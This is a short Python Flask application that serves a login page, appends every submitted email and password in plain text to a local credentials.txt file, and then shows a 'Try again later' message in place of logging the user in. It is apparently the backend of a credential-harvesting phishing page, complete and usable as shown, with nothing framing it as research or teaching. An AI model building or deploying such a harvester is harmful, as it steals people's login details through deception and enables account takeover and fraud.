from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')  # Loads login.html from /templates/

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Store credentials
    with open("credentials.txt", "a") as file:
        file.write(f"Email: {email}, Password: {password}\n")
    
    # Show "Try again later" message and then redirect
    return render_template('message.html')

if __name__ == '__main__':
    app.run(debug=True)
